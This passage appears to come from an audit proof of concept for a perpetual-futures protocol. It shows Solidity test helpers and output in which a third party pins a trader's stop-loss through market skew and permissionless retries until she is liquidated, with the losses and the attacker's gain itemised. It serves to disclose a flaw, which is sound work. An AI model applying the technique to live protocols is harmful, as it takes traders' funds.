        uint64 openId = router.commitOrder(CfdTypes.Side.LONG, SIZE, MARGIN, P0, false);
        router.executeOrder(openId, _mockPythUpdateData(P0));
        assertEq(_size(ALICE), SIZE, "Alice's long is open");
        _refreshMark(P0);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 250_000e6,
            maxGrossAccountDebitAssets: 1_000e6,
            maxActionChargeAssets: 500e6,
            maxExplicitFeesAssets: 120e6
        });
        vm.prank(ALICE);
        id = book.createPositionProtection(params);
    }

    function _trigger(
        address caller,
        uint64 id
    ) internal returns (uint64 attemptId) {
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory live = _livePriceData(STOP);
        vm.prank(caller);
        attemptId = book.triggerPositionProtection(id, live);
    }

    function _execute(
        address caller,
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(caller);
        result = router.executeOrder(orderId, data);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        uint256 nowTs = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, nowTs, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _firstReceipt(
        Vm.Log[] memory logs
    ) internal view returns (OrderV3Types.OrderReceipt memory receipt) {
        address lifecycle = address(router.lifecycleBook());
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == lifecycle && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector) {
                (,,, receipt) = abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                return receipt;
            }
        }
    }

    function _firstConstraintFailure(
        Vm.Log[] memory logs
    ) internal view returns (OrderV3Types.FailureDetails memory failure) {
        address lifecycle = address(router.lifecycleBook());
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == lifecycle && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector) {
                (,,, OrderV3Types.OrderReceipt memory receipt) =
                    abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                if (receipt.reason == OrderV3Types.TerminalReason.ConstraintViolation) {
                    return receipt.failure;
                }
            }
        }
    }

    /// @dev Realised price PnL from the engine's PositionClosed event, before VPI, carry and fees.
    function _realizedPnl(
        Vm.Log[] memory logs,
        address account
    ) internal view returns (int256 pnl) {
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter == address(engine) && logs[i].topics[0] == POSITION_CLOSED
                    && address(uint160(uint256(logs[i].topics[1]))) == account
            ) {
                (,,, pnl) = abi.decode(logs[i].data, (uint8, uint256, uint256, int256));
            }
        }
    }

    function _status(
        uint64 id
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return book.getPositionProtection(id).status;
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _total(
        address account
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(account) + engine.traderClaimBalanceAssets(account);
    }

    function _wideLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _fullCloseRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("alice-full-close");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = SIZE;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}
```

### Output

```
Ran 1 test for test/perps/ProtectionPin.t.sol:ProtectionPinPoC
[PASS] test_ThirdPartySkewLatchesStopLossAndPermissionlessRetryPinsItUntilLiquidation() (gas: 37003298)
Logs:
  cycles to cross 24 h: 25
  Alice unrealised PnL while pinned    : -1000.000000
  average gas of one expire + retry tx: 935944
  control: gross debit of the close   : 600.224371
  control: VPI of the close (rebate<0): -199.600798
  first attempt: actual gross debit   : 1082.044731
  first attempt: Alice's ceiling      : 1000.000000
  Alice loss, control (stop executes) : 760.864433
  Alice loss, attack (pinned)         : 2000.400000
  Alice extra loss over the control   : 1239.535567
  Alice paid before the trigger       : 279.800860
  Alice equity taken at liquidation   : 1720.399140
    to the liquidator (Bob's account) : 100.000000
    to the pool (LPs)                 : 1620.399140
  trigger bounty to Bob's account     : 0.200000
  Bob short: realised price gain      : 2850.000000
  Bob short: all-in gain after exit   : 2595.363780
  Bob short: fees, bounties, carry    : 254.636220
  pool cash change, Alice armed -> all closed: -1216.304640
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 55.38ms (45.24ms CPU time)
```
